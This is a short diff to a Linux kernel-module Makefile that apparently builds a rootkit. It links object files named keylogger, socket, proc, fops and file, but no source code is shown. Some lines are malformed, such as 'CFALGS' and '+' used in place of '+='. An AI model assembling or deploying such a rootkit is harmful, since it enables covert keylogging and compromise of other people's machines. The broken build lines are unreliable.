@@ -1,5 +1,15 @@
-obj-m += rootkit.o
-
+CC				= gcc
+CFALGS			= -Wall
+ROOTKIT			:= rootkit
+HEADERS			:=$(PWD)/headers
+obj-m 			:= $(ROOTKIT).o
+$(ROOTKIT)-y	+ file.o 
+$(ROOTKIT)-y	+ fops.o 
+$(ROOTKIT)-y	+ keylogger.o 
+$(ROOTKIT)-y	+ module.o 
+$(ROOTKIT)-y	+ proc.o 
+$(ROOTKIT)-y	+ rootkit.o 
+$(ROOTKIT)-y	+ socket.o 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
 
